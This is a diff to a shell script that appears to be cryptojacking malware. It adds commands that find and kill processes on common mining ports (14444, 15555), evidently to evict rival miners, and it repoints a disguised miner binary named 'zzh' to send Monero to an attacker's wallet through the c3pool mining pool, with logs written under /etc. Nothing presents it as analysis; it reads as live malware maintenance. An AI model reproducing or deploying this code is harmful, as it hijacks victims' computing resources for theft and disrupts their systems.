@@ -80,8 +80,12 @@ netstat -anp | grep :6667 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -
 netstat -anp | grep :7777 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
 netstat -anp | grep :8444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
 netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
+netstat -anp | grep :14444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
+netstat -anp | grep :15555 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
 ps aux | grep -v grep | grep ':3333' | awk '{print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep ':5555' | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep ':14444' | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep ':15555' | awk '{print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'kworker -c\' | awk '{print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'log_' | awk '{print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'systemten' | awk '{print $2}' | xargs -I % kill -9 %
@@ -815,7 +819,7 @@ elif (("$cpunum">64)); then
 else
       cpunum=1
 fi
-                ./zzh -B --log-file=/etc/etc --coin=monero -o stratum+tcp://xmr-asia1.nanopool.org:14444 --threads=$cpunum -u 4B4qdh346S9MTs9o8n8kRWRNgrXJktcAcKdq8qvjaevKEtXMSCFuKvD74UZbuT9ndsN1x8LcQzmk6HvySw2NxvUrDqSaU99.3910 -p x &
+                ./zzh -B --log-file=/etc/etc --coin=monero -o mine.c3pool.com:13333 --threads=$cpunum -u 4B4qdh346S9MTs9o8n8kRWRNgrXJktcAcKdq8qvjaevKEtXMSCFuKvD74UZbuT9ndsN1x8LcQzmk6HvySw2NxvUrDqSaU99 -p x &
     else
                 echo "root runing....."
     fi
@@ -893,7 +897,7 @@ elif (("$cpunum">64)); then
 else 
       echo other   
 fi
-                ./zzh -B --log-file=/etc/etc --coin=monero -o stratum+tcp://xmr-asia1.nanopool.org:14444 --threads=$cpunum -u 4B4qdh346S9MTs9o8n8kRWRNgrXJktcAcKdq8qvjaevKEtXMSCFuKvD74UZbuT9ndsN1x8LcQzmk6HvySw2NxvUrDqSaU99.3910 -p x &
+                ./zzh -B --log-file=/etc/etc --coin=monero -o mine.c3pool.com:13333 --threads=$cpunum -u 4B4qdh346S9MTs9o8n8kRWRNgrXJktcAcKdq8qvjaevKEtXMSCFuKvD74UZbuT9ndsN1x8LcQzmk6HvySw2NxvUrDqSaU99 -p x &
             else
                 echo "tmp runing....."
         fi
